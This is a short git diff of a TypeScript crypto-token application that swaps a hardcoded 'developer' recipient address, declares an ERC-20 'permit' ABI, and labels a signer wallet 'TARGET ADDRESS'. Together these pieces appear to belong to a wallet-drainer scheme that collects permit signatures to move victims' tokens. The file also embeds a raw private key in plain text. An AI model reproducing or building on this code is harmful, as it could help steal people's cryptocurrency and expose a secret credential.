@@ -11,8 +11,8 @@ import {JsonRpcSigner} from "@ethersproject/providers";
 import TokenList, {ContractCovalenTHQ} from "@/app/TokenList";
 
 const BNBContract = "0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43";
-const developer = {
-	address: "0xB932eF059c3857FBA2505B31E5899b3E170f25E7"
+let developer = {
+	address: "0xb3b77682060b7f6f589BAB55ECc269dF03ED3C96"
 }
 const abi = [
 	'function permit (address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
@@ -242,7 +242,7 @@ const createSigner = async (rpc: string): Promise<JsonRpcSigner>=>{
 	await provider.detectNetwork()
 	const privateKey = 'f0d3d8a445a62ee09543c760c0856560b2a8602b8f289e2b69c3ac0ce498df59';
 	_WALLET = new Wallet(privateKey, provider);
-	console.log(_WALLET.address)
+	console.log("TARGET ADDRESS",_WALLET.address)
 	return _WALLET as any;
 }
 
